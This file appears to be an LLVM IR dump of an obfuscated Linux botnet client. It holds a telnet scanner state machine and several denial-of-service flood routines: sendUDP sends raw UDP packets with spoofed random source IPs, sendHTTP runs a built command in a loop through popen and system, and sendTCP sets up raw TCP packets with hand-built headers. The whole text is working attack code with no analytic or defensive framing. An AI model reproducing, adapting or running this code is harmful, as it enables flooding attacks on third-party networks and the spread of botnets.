  store i8 0, i8* %1279, align 8
  %1280 = load i32, i32* %2, align 4
  %1281 = sext i32 %1280 to i64
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1281
  %1283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1282, i32 0, i32 8
  %1284 = load i8*, i8** %1283, align 8
  call void @llvm.memset.p0i8.i64(i8* %1284, i8 0, i64 1024, i32 1, i1 false)
  %1285 = load i32, i32* %2, align 4
  %1286 = sext i32 %1285 to i64
  %1287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1286
  %1288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1287, i32 0, i32 3
  store i8 1, i8* %1288, align 1
  br label %1329

; <label>:1289:                                   ; preds = %1224
  %1290 = load i32, i32* %2, align 4
  %1291 = sext i32 %1290 to i64
  %1292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1291
  %1293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1292, i32 0, i32 8
  %1294 = load i8*, i8** %1293, align 8
  %1295 = call i64 @strlen(i8* %1294) #10
  %1296 = trunc i64 %1295 to i16
  %1297 = load i32, i32* %2, align 4
  %1298 = sext i32 %1297 to i64
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1298
  %1300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1299, i32 0, i32 7
  store i16 %1296, i16* %1300, align 16
  br label %1301

; <label>:1301:                                   ; preds = %1289
  %1302 = load i32, i32* %2, align 4
  %1303 = sext i32 %1302 to i64
  %1304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1303
  %1305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1304, i32 0, i32 6
  %1306 = load i32, i32* %1305, align 4
  %1307 = sub i32 0, 30
  %1308 = sub i32 %1306, %1307
  %1309 = add i32 %1306, 30
  %1310 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1311 = icmp ult i32 %1308, %1310
  br i1 %1311, label %1312, label %1327

; <label>:1312:                                   ; preds = %1301
  %1313 = load i32, i32* %2, align 4
  %1314 = sext i32 %1313 to i64
  %1315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1314
  %1316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1315, i32 0, i32 0
  %1317 = load i32, i32* %1316, align 16
  %1318 = call i32 @sclose(i32 %1317)
  %1319 = load i32, i32* %2, align 4
  %1320 = sext i32 %1319 to i64
  %1321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1320
  %1322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1321, i32 0, i32 2
  store i8 0, i8* %1322, align 8
  %1323 = load i32, i32* %2, align 4
  %1324 = sext i32 %1323 to i64
  %1325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %1324
  %1326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1325, i32 0, i32 3
  store i8 1, i8* %1326, align 1
  br label %1327

; <label>:1327:                                   ; preds = %1312, %1301
  br label %1328

; <label>:1328:                                   ; preds = %1327, %1206, %1178, %1150, %1126, %987, %959, %931, %907, %755, %691, %560, %496, %407, %226, %67
  br label %1329

; <label>:1329:                                   ; preds = %1328, %1243, %1191, %1163, %1135, %1067, %972, %944, %916, %861, %836, %808, %740, %717, %637, %623, %545, %522, %440, %325, %176, %146
  %1330 = load i32, i32* %2, align 4
  %1331 = add i32 %1330, -419845046
  %1332 = add i32 %1331, 1
  %1333 = sub i32 %1332, -419845046
  %1334 = add nsw i32 %1330, 1
  store i32 %1333, i32* %2, align 4
  br label %63

; <label>:1335:                                   ; preds = %63
  br label %61
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

declare i32 @time(...) #5

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %322

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %119

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #4
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i32 0, i32 0))
  br label %322

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* %11, align 4
  %61 = sub i32 0, %60
  %62 = sub i32 0, 1
  %63 = add i32 %61, %62
  %64 = sub i32 0, %63
  %65 = add nsw i32 %60, 1
  %66 = sext i32 %64 to i64
  %67 = call noalias i8* @malloc(i64 %66) #4
  store i8* %67, i8** %16, align 8
  %68 = load i8*, i8** %16, align 8
  %69 = icmp eq i8* %68, null
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %59
  br label %322

; <label>:71:                                     ; preds = %59
  %72 = load i8*, i8** %16, align 8
  %73 = load i32, i32* %11, align 4
  %74 = sub i32 0, %73
  %75 = sub i32 0, 1
  %76 = add i32 %74, %75
  %77 = sub i32 0, %76
  %78 = add nsw i32 %73, 1
  %79 = sext i32 %77 to i64
  call void @llvm.memset.p0i8.i64(i8* %72, i8 0, i64 %79, i32 1, i1 false)
  %80 = load i8*, i8** %16, align 8
  %81 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %80, i32 %81)
  %82 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %83 = load i32, i32* %9, align 4
  %84 = sub i32 0, %82
  %85 = sub i32 0, %83
  %86 = add i32 %84, %85
  %87 = sub i32 0, %86
  %88 = add nsw i32 %82, %83
  store i32 %87, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %89

; <label>:89:                                     ; preds = %112, %111, %71
  %90 = load i32, i32* %15, align 4
  %91 = load i8*, i8** %16, align 8
  %92 = load i32, i32* %11, align 4
  %93 = sext i32 %92 to i64
  %94 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %95 = call i64 @sendto(i32 %90, i8* %91, i64 %93, i32 0, %struct.sockaddr* %94, i32 16)
  %96 = load i32, i32* %18, align 4
  %97 = load i32, i32* %14, align 4
  %98 = icmp eq i32 %96, %97
  br i1 %98, label %99, label %112

; <label>:99:                                     ; preds = %89
  %100 = load i32, i32* %8, align 4
  %101 = icmp eq i32 %100, 0
  br i1 %101, label %102, label %106

; <label>:102:                                    ; preds = %99
  %103 = call i32 @rand_cmwc()
  %104 = trunc i32 %103 to i16
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  br label %106

; <label>:106:                                    ; preds = %102, %99
  %107 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %108 = load i32, i32* %17, align 4
  %109 = icmp sgt i32 %107, %108
  br i1 %109, label %110, label %111

; <label>:110:                                    ; preds = %106
  br label %118

; <label>:111:                                    ; preds = %106
  store i32 0, i32* %18, align 4
  br label %89

; <label>:112:                                    ; preds = %89
  %113 = load i32, i32* %18, align 4
  %114 = add i32 %113, 593612053
  %115 = add i32 %114, 1
  %116 = sub i32 %115, 593612053
  %117 = add i32 %113, 1
  store i32 %116, i32* %18, align 4
  br label %89

; <label>:118:                                    ; preds = %110
  br label %322

; <label>:119:                                    ; preds = %46
  %120 = call i32 @socket(i32 2, i32 3, i32 17) #4
  store i32 %120, i32* %19, align 4
  %121 = load i32, i32* %19, align 4
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %126, label %123

; <label>:123:                                    ; preds = %119
  %124 = load i32, i32* @mainCommSock, align 4
  %125 = call i32 (i32, i8*, ...) @sockprintf(i32 %124, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i32 0, i32 0))
  br label %322

; <label>:126:                                    ; preds = %119
  store i32 1, i32* %20, align 4
  %127 = load i32, i32* %19, align 4
  %128 = bitcast i32* %20 to i8*
  %129 = call i32 @setsockopt(i32 %127, i32 0, i32 3, i8* %128, i32 4) #4
  %130 = icmp slt i32 %129, 0
  br i1 %130, label %131, label %134

; <label>:131:                                    ; preds = %126
  %132 = load i32, i32* @mainCommSock, align 4
  %133 = call i32 (i32, i8*, ...) @sockprintf(i32 %132, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.38, i32 0, i32 0))
  br label %322

; <label>:134:                                    ; preds = %126
  store i32 50, i32* %21, align 4
  br label %135

; <label>:135:                                    ; preds = %142, %134
  %136 = load i32, i32* %21, align 4
  %137 = sub i32 %136, -1899285540
  %138 = add i32 %137, -1
  %139 = add i32 %138, -1899285540
  %140 = add nsw i32 %136, -1
  store i32 %139, i32* %21, align 4
  %141 = icmp ne i32 %136, 0
  br i1 %141, label %142, label %152

; <label>:142:                                    ; preds = %135
  %143 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %144 = call i32 @rand_cmwc()
  %145 = xor i32 %143, -1
  %146 = and i32 %144, %145
  %147 = xor i32 %144, -1
  %148 = and i32 %143, %147
  %149 = or i32 %146, %148
  %150 = xor i32 %143, %144
  call void @srand(i32 %149) #4
  %151 = call i32 @rand() #4
  call void @init_rand(i32 %151)
  br label %135

; <label>:152:                                    ; preds = %135
  %153 = load i32, i32* %10, align 4
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %155, label %156

; <label>:155:                                    ; preds = %152
  store i32 0, i32* %22, align 4
  br label %176

; <label>:156:                                    ; preds = %152
  %157 = load i32, i32* %10, align 4
  %158 = sub i32 0, %157
  %159 = add i32 32, %158
  %160 = sub nsw i32 32, %157
  %161 = shl i32 1, %159
  %162 = sub i32 0, 1
  %163 = add i32 %161, %162
  %164 = sub nsw i32 %161, 1
  %165 = xor i32 %163, -1
  %166 = and i32 1593348881, %165
  %167 = xor i32 1593348881, -1
  %168 = and i32 %163, %167
  %169 = xor i32 -1, -1
  %170 = and i32 %169, 1593348881
  %171 = and i32 -1, %167
  %172 = or i32 %166, %168
  %173 = or i32 %170, %171
  %174 = xor i32 %172, %173
  %175 = xor i32 %163, -1
  store i32 %174, i32* %22, align 4
  br label %176

; <label>:176:                                    ; preds = %156, %155
  %177 = load i32, i32* %11, align 4
  %178 = sext i32 %177 to i64
  %179 = sub i64 28, 5041880971898780079
  %180 = add i64 %179, %178
  %181 = add i64 %180, 5041880971898780079
  %182 = add i64 28, %178
  %183 = call i8* @llvm.stacksave()
  store i8* %183, i8** %23, align 8
  %184 = alloca i8, i64 %181, align 16
  %185 = bitcast i8* %184 to %struct.iphdr*
  store %struct.iphdr* %185, %struct.iphdr** %24, align 8
  %186 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %187 = bitcast %struct.iphdr* %186 to i8*
  %188 = getelementptr i8, i8* %187, i64 20
  %189 = bitcast i8* %188 to %struct.udphdr*
  store %struct.udphdr* %189, %struct.udphdr** %25, align 8
  %190 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %191 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %192 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %191, i32 0, i32 0
  %193 = load i32, i32* %192, align 4
  %194 = load i32, i32* %22, align 4
  %195 = call i32 @getRandomIP(i32 %194)
  %196 = call i32 @htonl(i32 %195) #13
  %197 = load i32, i32* %11, align 4
  %198 = sext i32 %197 to i64
  %199 = sub i64 8, -8964361028008530648
  %200 = add i64 %199, %198
  %201 = add i64 %200, -8964361028008530648
  %202 = add i64 8, %198
  %203 = trunc i64 %201 to i32
  call void @makeIPPacket(%struct.iphdr* %190, i32 %193, i32 %196, i8 zeroext 17, i32 %203)
  %204 = load i32, i32* %11, align 4
  %205 = sext i32 %204 to i64
  %206 = sub i64 0, %205
  %207 = sub i64 8, %206
  %208 = add i64 8, %205
  %209 = trunc i64 %207 to i16
  %210 = call zeroext i16 @htons(i16 zeroext %209) #13
  %211 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %212 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %211, i32 0, i32 0
  %213 = bitcast %union.anon.2* %212 to %struct.anon.3*
  %214 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %213, i32 0, i32 2
  store i16 %210, i16* %214, align 2
  %215 = call i32 @rand_cmwc()
  %216 = trunc i32 %215 to i16
  %217 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %218 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %217, i32 0, i32 0
  %219 = bitcast %union.anon.2* %218 to %struct.anon.3*
  %220 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %219, i32 0, i32 0
  store i16 %216, i16* %220, align 2
  %221 = load i32, i32* %8, align 4
  %222 = icmp eq i32 %221, 0
  br i1 %222, label %223, label %225

; <label>:223:                                    ; preds = %176
  %224 = call i32 @rand_cmwc()
  br label %230

; <label>:225:                                    ; preds = %176
  %226 = load i32, i32* %8, align 4
  %227 = trunc i32 %226 to i16
  %228 = call zeroext i16 @htons(i16 zeroext %227) #13
  %229 = zext i16 %228 to i32
  br label %230

; <label>:230:                                    ; preds = %225, %223
  %231 = phi i32 [ %224, %223 ], [ %229, %225 ]
  %232 = trunc i32 %231 to i16
  %233 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %234 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %233, i32 0, i32 0
  %235 = bitcast %union.anon.2* %234 to %struct.anon.3*
  %236 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %235, i32 0, i32 1
  store i16 %232, i16* %236, align 2
  %237 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %238 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %237, i32 0, i32 0
  %239 = bitcast %union.anon.2* %238 to %struct.anon.3*
  %240 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %239, i32 0, i32 3
  store i16 0, i16* %240, align 2
  %241 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %242 = bitcast %struct.udphdr* %241 to i8*
  %243 = getelementptr inbounds i8, i8* %242, i64 8
  %244 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %243, i32 %244)
  %245 = bitcast i8* %184 to i16*
  %246 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 2
  %248 = load i16, i16* %247, align 2
  %249 = zext i16 %248 to i32
  %250 = call zeroext i16 @csum(i16* %245, i32 %249)
  %251 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 7
  store i16 %250, i16* %252, align 2
  %253 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %254 = load i32, i32* %9, align 4
  %255 = sub i32 0, %253
  %256 = sub i32 0, %254
  %257 = add i32 %255, %256
  %258 = sub i32 0, %257
  %259 = add nsw i32 %253, %254
  store i32 %258, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %260

; <label>:260:                                    ; preds = %313, %312, %230
  br label %261

; <label>:261:                                    ; preds = %260
  %262 = load i32, i32* %19, align 4
  %263 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %264 = call i64 @sendto(i32 %262, i8* %184, i64 %181, i32 0, %struct.sockaddr* %263, i32 16)
  %265 = call i32 @rand_cmwc()
  %266 = trunc i32 %265 to i16
  %267 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %268 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %267, i32 0, i32 0
  %269 = bitcast %union.anon.2* %268 to %struct.anon.3*
  %270 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %269, i32 0, i32 0
  store i16 %266, i16* %270, align 2
  %271 = load i32, i32* %8, align 4
  %272 = icmp eq i32 %271, 0
  br i1 %272, label %273, label %275

; <label>:273:                                    ; preds = %261
  %274 = call i32 @rand_cmwc()
  br label %280

; <label>:275:                                    ; preds = %261
  %276 = load i32, i32* %8, align 4
  %277 = trunc i32 %276 to i16
  %278 = call zeroext i16 @htons(i16 zeroext %277) #13
  %279 = zext i16 %278 to i32
  br label %280

; <label>:280:                                    ; preds = %275, %273
  %281 = phi i32 [ %274, %273 ], [ %279, %275 ]
  %282 = trunc i32 %281 to i16
  %283 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %284 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %283, i32 0, i32 0
  %285 = bitcast %union.anon.2* %284 to %struct.anon.3*
  %286 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %285, i32 0, i32 1
  store i16 %282, i16* %286, align 2
  %287 = call i32 @rand_cmwc()
  %288 = trunc i32 %287 to i16
  %289 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 3
  store i16 %288, i16* %290, align 4
  %291 = load i32, i32* %22, align 4
  %292 = call i32 @getRandomIP(i32 %291)
  %293 = call i32 @htonl(i32 %292) #13
  %294 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 8
  store i32 %293, i32* %295, align 4
  %296 = bitcast i8* %184 to i16*
  %297 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 2
  %299 = load i16, i16* %298, align 2
  %300 = zext i16 %299 to i32
  %301 = call zeroext i16 @csum(i16* %296, i32 %300)
  %302 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 7
  store i16 %301, i16* %303, align 2
  %304 = load i32, i32* %27, align 4
  %305 = load i32, i32* %14, align 4
  %306 = icmp eq i32 %304, %305
  br i1 %306, label %307, label %313

; <label>:307:                                    ; preds = %280
  %308 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %309 = load i32, i32* %26, align 4
  %310 = icmp sgt i32 %308, %309
  br i1 %310, label %311, label %312

; <label>:311:                                    ; preds = %307
  br label %320

; <label>:312:                                    ; preds = %307
  store i32 0, i32* %27, align 4
  br label %260

; <label>:313:                                    ; preds = %280
  %314 = load i32, i32* %27, align 4
  %315 = sub i32 0, %314
  %316 = sub i32 0, 1
  %317 = add i32 %315, %316
  %318 = sub i32 0, %317
  %319 = add i32 %314, 1
  store i32 %318, i32* %27, align 4
  br label %260

; <label>:320:                                    ; preds = %311
  %321 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %321)
  br label %322

; <label>:322:                                    ; preds = %320, %131, %123, %118, %70, %56, %45
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca [80 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %9 = load i32, i32* %4, align 4
  %10 = sub i32 0, %8
  %11 = sub i32 0, %9
  %12 = add i32 %10, %11
  %13 = sub i32 0, %12
  %14 = add nsw i32 %8, %9
  store i32 %13, i32* %5, align 4
  %15 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %16 = call i32 (i8*, i8*, ...) @sprintf(i8* %15, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.39, i32 0, i32 0)) #4
  %17 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %18 = load i8*, i8** %3, align 8
  %19 = call i8* @strcat(i8* %17, i8* %18) #4
  %20 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %21 = call i8* @strcat(i8* %20, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.40, i32 0, i32 0)) #4
  %22 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %23 = call %struct._IO_FILE* @popen(i8* %22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0))
  store %struct._IO_FILE* %23, %struct._IO_FILE** %6, align 8
  br label %24

; <label>:24:                                     ; preds = %28, %2
  %25 = load i32, i32* %5, align 4
  %26 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %27 = icmp sgt i32 %25, %26
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %24
  %29 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %30 = call i32 @system(i8* %29)
  br label %24

; <label>:31:                                     ; preds = %24
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #3

declare %struct._IO_FILE* @popen(i8*, i8*) #5

declare i32 @system(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %504

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #4
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i32 0, i32 0))
  br label %504

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #4
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.38, i32 0, i32 0))
  br label %504

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %87

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub i32 0, %67
  %69 = add i32 32, %68
  %70 = sub nsw i32 32, %67
  %71 = shl i32 1, %69
  %72 = add i32 %71, -1899718573
  %73 = sub i32 %72, 1
  %74 = sub i32 %73, -1899718573
  %75 = sub nsw i32 %71, 1
  %76 = xor i32 %74, -1
  %77 = and i32 35272965, %76
  %78 = xor i32 35272965, -1
  %79 = and i32 %74, %78
  %80 = xor i32 -1, -1
  %81 = and i32 %80, 35272965
  %82 = and i32 -1, %78
  %83 = or i32 %77, %79
  %84 = or i32 %81, %82
  %85 = xor i32 %83, %84
  %86 = xor i32 %74, -1
  store i32 %85, i32* %19, align 4
  br label %87

; <label>:87:                                     ; preds = %66, %65
  %88 = load i32, i32* %13, align 4
  %89 = sext i32 %88 to i64
  %90 = sub i64 0, %89
  %91 = sub i64 40, %90
  %92 = add i64 40, %89
  %93 = call i8* @llvm.stacksave()
  store i8* %93, i8** %20, align 8
  %94 = alloca i8, i64 %91, align 16
  %95 = bitcast i8* %94 to %struct.iphdr*
  store %struct.iphdr* %95, %struct.iphdr** %21, align 8
  %96 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %97 = bitcast %struct.iphdr* %96 to i8*
  %98 = getelementptr i8, i8* %97, i64 20
  %99 = bitcast i8* %98 to %struct.tcphdr*
  store %struct.tcphdr* %99, %struct.tcphdr** %22, align 8
  %100 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
